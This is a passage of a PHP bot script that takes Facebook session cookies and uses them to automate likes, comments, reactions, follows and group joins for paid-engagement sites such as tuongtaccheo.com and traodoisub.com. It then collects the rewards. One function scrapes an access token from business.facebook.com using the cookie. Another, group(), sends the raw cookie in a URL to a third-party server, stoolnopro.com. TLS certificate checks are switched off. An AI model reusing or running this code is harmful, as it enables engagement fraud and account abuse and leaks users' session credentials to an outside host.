            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER =>
            array(
                "Cookie:" . $cookie,
            ),
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_ENCODING => TRUE,
        )
    );
    $ch = curl_exec($ch);
    return $ch;
}


function GET($cookie)
{
    $head = array("Connection: keep-alive", "Keep-Alive: 300", "authority: m.facebook.com", "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "cache-control: max-age=0", "upgrade-insecure-requests: 1", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-site: none", "sec-fetch-mode: navigate", "sec-fetch-user: ?1", "sec-fetch-dest: document");
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://business.facebook.com/content_management/",
        CURLOPT_USERAGENT => $_SESSION["useragent"],
        CURLOPT_COOKIE => $cookie,
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => FALSE,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_FOLLOWLOCATION => TRUE
    ));
    $access = curl_exec($ch);
    curl_close($ch);
    $access_token = 'EAAG' . explode('","', explode('EAAG', $access)[1])[0];

    if (strlen($access_token) > 5) {
        return $access_token;
    } else {
        return "1";
    }
}

function nhantiencxcmt($id, $type)
{
    $url  = "https://tuongtaccheo.com/kiemtien/camxuccheobinhluan/nhantien.php";
    $data = "id=" . $id . "&loaicx=" . $type;
    $head = array(
        "Host: tuongtaccheo.com",
        "content-length: " . strlen($data),
        "x-requested-with: XMLHttpRequest",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://tuongtaccheo.com",
        "referer: https://tuongtaccheo.com/kiemtien/camxuccheobinhluan"
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => TRUE,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
        CURLOPT_USERAGENT => $_SESSION['useragent'],
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_ENCODING => TRUE
    ));
    $a = json_decode(curl_exec($ch), true);
    return $a;
}

function nhantiencx($id, $type)
{
    $url  = "https://tuongtaccheo.com/kiemtien/camxuccheo/nhantien.php";
    $data = "id=" . $id . "&loaicx=" . $type;
    $head = array(
        "Host: tuongtaccheo.com",
        "content-length: " . strlen($data),
        "x-requested-with: XMLHttpRequest",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://tuongtaccheo.com",
        "referer: https://tuongtaccheo.com/kiemtien/camxuccheo"
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => TRUE,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
        CURLOPT_USERAGENT => $_SESSION['useragent'],
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_ENCODING => TRUE
    ));
    $a = json_decode(curl_exec($ch), true);
    return $a;
}

function thongtin($id, $cookie, $useragent)
{

    $ch = curl_init();
    $header = array(
        "Host:m.facebook.com",
        "user-agent:$useragent",
        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "cookie:$cookie",
    );
    $linkbv = 'https://m.facebook.com/' . $id . '/about';
    curl_setopt($ch, CURLOPT_URL, $linkbv);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
    :'));
    $page = curl_exec($ch);
    $page1 = json_decode($page);
    //echo "\n".$page."\n\n\n\n";

    // $code_post = explode('<span>', $page)[2];
    // $code_post = explode('</span>', $code_post)[0];
    //   echo "\n\n".$code_post;
    // $id_post = explode('mf_story_key":"', $code_post)[1];
    // $id_post = explode('"', $id_post)[0];


    // //tennguoidung
    return $page;
}

function logintoken()
{
    while (true) {
        $fp = fopen('config_ttc.txt', "r");
        $tokenttc  = fread($fp, filesize('config_ttc.txt'));
        fclose($fp);
        $data = 'access_token=' . $tokenttc;
        $head[] = 'Content-type: application/x-www-form-urlencoded';
        $ch   = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://tuongtaccheo.com/logintoken.php',
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER => $head,
            CURLOPT_COOKIEJAR => "TTC.txt",
            CURLOPT_COOKIEFILE => "TTC.txt",
            CURLOPT_USERAGENT => $_SESSION['useragent'],
            CURLOPT_ENCODING => TRUE
        ));
        $login = json_decode(curl_exec($ch));
        if ($login->status == 'success') {
            $xu = $login->data->sodu;
            $_SESSION['user'] = $login->data->user;
            $js = fopen($_SESSION['user'] . ".txt", "w+");
            file_put_contents($_SESSION['user'] . ".txt", file_get_contents("TTC.txt"));
            unlink("TTC.txt");
            $RT = true;
            break;
        } else if ($login->status == 'fail') {
            echo "\033[1;31m " . $login->mess . "\n";
            $RT = false;
            break;
        } else {
            echo "\r\033[1;31m Kiểm Tra VPN (không đc sử dụng ip nước ngoài) \r";
            sleep(1);
            $RT = false;
        }
    }
    return $RT;
}

function coin()
{
    $dem = 0;
    while ($dem < 3) {
        $dem++;
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://tuongtaccheo.com/home.php',
            CURLOPT_PORT => "443",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
            CURLOPT_USERAGENT => $_SESSION['useragent'],
        ));
        $access = curl_exec($ch);
        curl_close($ch);
        $xu = explode('"soduchinh">', explode('</strong>', $access)[0])[1];
        if (strpos($access, "Chào mừng") == false) {
            $login = logintoken();
            if ($login == true) {
                //echo "\033[1;32m COOKIE TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THÀNH CÔNG \n";
                continue;
            } else {
                //echo "\033[1;31m COOKIE TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THẤT BẠI \n";
                die;
            }
        } else if ($xu !== '') {
            return $xu;
        } else {
            echo "\033[1;31m Lỗi Không Xác Định                  \r";
        }
    }
}

function cauhinh($idfb)
{
    while (true) {
        $data = "iddat[]=" . $idfb . "&loai=fb";
        $head = array(
            "Host: tuongtaccheo.com",
            "content-length: " . strlen($data),
            "accept: */*",
            "origin: https://tuongtaccheo.com",
            "x-requested-with: XMLHttpRequest",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "referer: https://tuongtaccheo.com/cauhinh/index.php"
        );
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://tuongtaccheo.com/cauhinh/datnick.php',
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
            CURLOPT_USERAGENT => $_SESSION['useragent'],
            CURLOPT_HTTPHEADER => $head,
            CURLOPT_ENCODING => TRUE
        ));
        $access = curl_exec($ch);
        if (strpos($access, 'Chưa đăng nhập !!!') !== false) {
            $login = logintoken();
            if ($login == true) {
                //echo "\033[1;32m COOKIE TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THÀNH CÔNG \r";
                continue;
            } else {
                //echo "\033[1;31m TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THẤT BẠI \n";
                die;
            }
        } else {
            return $access;
        }
    }
}


function group_fb($id, $useragent, $cookie)
{
    $ch = curl_init();
    if (strpos($id, '_')) {
        $uid = explode('_', $id, 2);
        $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
    } else {
        $id2 = $id;
    }

    $header = array(
        "Host:mbasic.facebook.com",
        "user-agent:$useragent",
        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "cookie:$cookie",
    );
    //ketnoimangV1();
    $linkbv = 'https://mbasic.facebook.com/groups/' . $id2;
    curl_setopt($ch, CURLOPT_URL, $linkbv);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
                    :'));
    // json_decode(curl_exec($ch), true);
    $post = curl_exec($ch);


    $link = explode('<form method="post" action="/a/group/join/?group_id=', $post)[1];
    $link = explode('"', $link)[0];
    $link = html_entity_decode($link);
    $link = "https://mbasic.facebook.com/a/group/join/?group_id=" . $link;
    // echo $link;
    // die();
    $linkreac1 = $link;
    $header = array(
        "Host:mbasic.facebook.com",
        "user-agent:$useragent",
        "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer:$linkbv",
        "cookie:$cookie",
    );
    //ketnoimangV1();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkreac1);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $page = curl_exec($ch);
    $aa = $page;

    return $aa;
}


function follow($idtest, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $idtest . '?_rdr');
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "upgrade-insecure-requests: 1";
    // $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    // $head[] = "Accept-Language: en-us,en;q=0.5";
    // $head[] = "Accept-encoding: gzip, deflate, br";
    // $head[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $head[] = "sec-ch-ua-mobile: ?0";
    $head[] = "sec-fetch-user: ?1";
    $head[] = "sec-fetch-site: none";
    $head[] = "sec-fetch-dest: document";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36');
    //curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_REFERER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $access = curl_exec($ch);
    //return $access;
    $url1 = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    if (strpos($access, '/a/subscribe.php?') !== false) {
        $haha = explode('<a href="', $access);
        //$haha2 = null;
        //echo 1;
        for ($v = 0; $v < count($haha); $v++) {
            if (strpos($haha[$v], '/a/subscribe.php?') !== false) {
                $haha2 = explode('" class=', $haha[$v])[0];
                break;
            }
        }
        //if()
        $link2 = html_entity_decode($haha2);
        // echo $url1;
        curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2 . '&_rdr');
        curl_setopt($ch, CURLOPT_REFERER, $url1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        $fl = curl_exec($ch);
        //echo curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);
        //return $fl;
    } else {
        curl_close($ch);
        return 'id ' . $idtest . ' loi';
        //return $access;
    }
}

function like($access_token, $id, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/' . $id . '/likes');
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "authority: m.facebook.com";
    $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
    $head[] = "cache-control: max-age=0";
    $head[] = "upgrade-insecure-requests: 1";
    $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $head[] = "sec-fetch-site: none";
    $head[] = "sec-fetch-mode: navigate";
    $head[] = "sec-fetch-user: ?1";
    $head[] = "sec-fetch-dest: document";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $data = array('access_token' => $access_token);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $access = curl_exec($ch);
    curl_close($ch);
    return json_decode($access);
}
function cmt($access_token, $id, $cookie, $msg)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/' . $id . '/comments');
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "authority: m.facebook.com";
    $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
    $head[] = "cache-control: max-age=0";
    $head[] = "upgrade-insecure-requests: 1";
    $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $head[] = "sec-fetch-site: none";
    $head[] = "sec-fetch-mode: navigate";
    $head[] = "sec-fetch-user: ?1";
    $head[] = "sec-fetch-dest: document";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    $data = array('message' => $msg, 'access_token' => $access_token);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $access = curl_exec($ch);
    curl_close($ch);
    return json_decode($access);
}
function camxuc($id, $type, $cookie)
{
    $ch = curl_init();
    if (strpos($id, '_')) {
        $uid = explode('_', $id, 2);
        $id2 = 'story.php?story_fbid=' . $uid[1] . '&id=' . $uid[0];
    } else {
        $id2 = $id;
    }
    curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $id2);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
	:'));
    $page = curl_exec($ch);
    if ($id2 != $id && explode('&amp;origin_uri=', explode('amp;ft_id=', $page, 2)[1], 2)[0]) {
        $get = explode('&amp;origin_uri=', explode('amp;ft_id=', $page, 2)[1], 2)[0];
    } else {
        $get = $id2;
    }
    $link = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=' . $get;
    curl_setopt($ch, CURLOPT_URL, $link);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $cx = curl_exec($ch);
    $haha = explode('<a href="', $cx);
    if ($type == 'LIKE') {
        $haha2 = explode('" style="display:block"', $haha[1])[0];
    } elseif ($type == 'LOVE') {
        $haha2 = explode('" style="display:block"', $haha[2])[0];
    } elseif ($type == 'CARE') {
        $haha2 = explode('" style="display:block"', $haha[3])[0];
    } else if ($type == 'HAHA') {
        $haha2 = explode('" style="display:block"', $haha[4])[0];
    } else if ($type == 'WOW') {
        $haha2 = explode('" style="display:block"', $haha[5])[0];
    } else if ($type == 'SAD') {
        $haha2 = explode('" style="display:block"', $haha[6])[0];
    } elseif ($type == 'ANGRY') {
        $haha2 = explode('" style="display:block"', $haha[7])[0];
    }
    $link2 = html_entity_decode($haha2);
    curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com' . $link2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}

function page($id, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/' . $id);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
	:'));
    $page = curl_exec($ch);
    if (explode('&amp;refid=', explode('pageSuggestionsOnLiking=1&amp;gfid=', $page)[1])[0]) {
        $get = explode('&amp;refid=', explode('pageSuggestionsOnLiking=1&amp;gfid=', $page)[1])[0];
        $link = 'https://mbasic.facebook.com/a/profile.php?fan&id=' . $id . '&origin=page_profile&pageSuggestionsOnLiking=1&gfid=' . $get . '&refid=17';
        curl_setopt($ch, CURLOPT_URL, $link);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
    }
    curl_close($ch);
}

function datnick($idfb)
{
    $data = "iddat=" . $idfb;
    //ketnoimangV1();
    $head = array(
        "Host: traodoisub.com",
        "content-length: " . strlen($data),
        "accept: */*",
        "x-requested-with: XMLHttpRequest",
        "sec-ch-ua-mobile: ?1",
        "save-data: on",
        "user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://traodoisub.com",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://traodoisub.com/view/cauhinh/"
    );
    //ketnoimangV1();
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://traodoisub.com/scr/datnick.php',
        CURLOPT_FOLLOWLOCATION => TRUE,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_COOKIEFILE => "TDS.txt",
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_ENCODING => TRUE
    ));
    //ketnoimangV1();
    $a = curl_exec($ch);
    curl_close($ch);
    return $a;
}



function getnv($type)
{
    $dem = 0;
    while ($dem < 3) {
        $dem++;
        $head = array(
            "Host: tuongtaccheo.com",
            "accept: application/json, text/javascript, *" . "/" . "*; q=0.01",
            "x-requested-with: XMLHttpRequest",
            "user-agent: Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
            "referer: https://tuongtaccheo.com/kiemtien/"
        );
        $ch   = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://tuongtaccheo.com/kiemtien' . $type . '/getpost.php',
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_HTTPGET => true,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
            CURLOPT_HTTPHEADER => $head,
            CURLOPT_ENCODING => TRUE
        ));
        $access = curl_exec($ch);
        if ($access == 0) {
            $login = logintoken();
            if ($login == true) {
                //echo "\033[1;32m COOKIE TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THÀNH CÔNG \r";
                return json_decode($access, true);
                continue;
            } else {
                //echo "\033[1;32m COOKIE TUONGTACCHEO DIE, ĐĂNG NHẬP LẠI THẤT BẠI \n";
                die;
            }
        } else {
            return json_decode($access, true);
        }
    }
}
function nhantien($id, $type)
{
    $url  = "https://tuongtaccheo.com/kiemtien" . $type . "/nhantien.php";
    $data = "id=" . $id;
    $head = array(
        "Host: tuongtaccheo.com",
        "content-length: " . strlen($data),
        "x-requested-with: XMLHttpRequest",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://tuongtaccheo.com",
        "referer: https://tuongtaccheo.com/kiemtien" . $type
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => TRUE,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_COOKIEFILE => $_SESSION['user'] . ".txt",
        CURLOPT_USERAGENT => $_SESSION['useragent'],
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_ENCODING => TRUE
    ));
    $a = json_decode(curl_exec($ch), true);
    return $a;
}


function group($id, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://stoolnopro.com/admin/api/group.php?id=' . $id . '&cookie=' . $cookie);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $send = json_decode(curl_exec($ch), true);
    curl_close($ch);
    return $send;
}

function joingroup($id, $cookie)
{
    $url  = "https://mbasic.facebook.com/groups/" . $id . "";
    $head = array(
        "Host: mbasic.facebook.com",
        "upgrade-insecure-requests: 1",
        "save-data: on",
        "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*" . "/" . "*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site: same-origin",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    );
    $ch   = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POST => 1,
        CURLOPT_HTTPGET => true,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_HEADER => true,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_ENCODING => TRUE
    ));
    $a = curl_exec($ch);
    if (strpos($a, "xs=deleted") == true) {
        print "\033[1;31m Cookie Die\n";
        //exit();
    }
